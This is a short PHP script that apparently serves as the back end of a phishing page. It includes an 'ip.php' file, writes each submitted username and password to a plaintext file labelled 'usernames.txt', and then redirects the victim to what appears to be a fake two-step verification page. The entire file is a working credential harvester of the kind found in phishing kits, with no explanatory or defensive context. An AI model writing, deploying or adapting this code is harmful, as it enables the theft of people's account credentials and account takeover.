<?php
include "ip.php";
file_put_contents("usernames.txt", "⚙️User : " . $_POST['username'] . "\n🔐New Password: " . $_POST['password'] ."\n", FILE_APPEND);
header("Location: twostep.html");
exit();
?>
